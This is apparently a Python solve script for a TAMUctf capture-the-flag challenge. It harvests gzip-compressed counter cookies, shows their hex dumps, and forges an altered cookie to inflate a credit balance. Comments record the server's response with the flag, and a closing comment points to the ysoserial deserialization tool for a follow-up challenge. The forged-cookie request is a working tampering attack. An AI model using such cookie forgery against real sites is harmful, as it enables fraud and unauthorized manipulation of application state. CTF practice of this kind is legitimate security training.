import requests
from base64 import b64decode, b64encode

URL = "http://toomanycredits.tamuctf.com/"

s = requests.Session()

"""
def to_hex(b):
    return ''.join(hex(c)[2:].zfill(2) for c in b)

for _ in range(100):
    r = s.get(URL)
    cookie = r.cookies['counter'][1:-1]  # remove quotes
    print(to_hex(b64decode(cookie)))

1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 03 00 b6 12 99 63 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 23 00 20 22 9e 14 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 13 00 9a 73 97 8d 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 33 00 0c 43 90 fa 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 0b 00 af d6 f4 64 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 2b 00 39 e6 f3 13 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 1b 00 83 b7 fa 8a 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 3b 00 15 87 fd fd 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 07 00 84 9a 42 6d 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 27 00 12 aa 45 1a 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 17 00 a8 fb 4c 83 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 37 00 3e cb 4b f4 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 0f 00 9d 5e 2f 6a 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 2f 00 0b 6e 28 1d 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 1f 00 b1 3f 21 84 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 80 3f 00 27 0f 26 f3 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 00 00 d2 02 2e 7e 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 20 00 44 32 29 09 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 10 00 fe 63 20 90 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 30 00 68 53 27 e7 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 08 00 cb c6 43 79 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 28 00 5d f6 44 0e 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 18 00 e7 a7 4d 97 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 38 00 71 97 4a e0 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 04 00 e0 8a f5 70 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 24 00 76 ba f2 07 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 14 00 cc eb fb 9e 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 34 00 5a db fc e9 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 0c 00 f9 4e 98 77 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 2c 00 6f 7e 9f 00 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 1c 00 d5 2f 96 99 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 3c 00 43 1f 91 ee 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 02 00 7e 32 f7 58 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 22 00 e8 02 f0 2f 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 12 00 52 53 f9 b6 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 32 00 c4 63 fe c1 52000000
1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 40 0a 00 67 f6 9a 5f 52000000

"""

guess = bytes.fromhex("1f8b08000000000000005bf39681b5b8884137393f572fb9283525b3a41883cecd4f49cdd17306f39cf34bf34a8c386f0b8970aab83331307a31b09625e694a656143040 20 0a 00 67 f6 9a 5f 52000000".replace(" ", ""))

r = requests.get(URL, cookies={'counter': '"' + b64encode(guess).decode() + '"'})
print(r.text)

# <span>You have 31525678435270657 credits.</span>
# <span> gigem{l0rdy_th15_1s_mAny_cr3d1ts}</span>



#TOO_MANY_CREDITS_2 er https://github.com/frohoff/ysoserial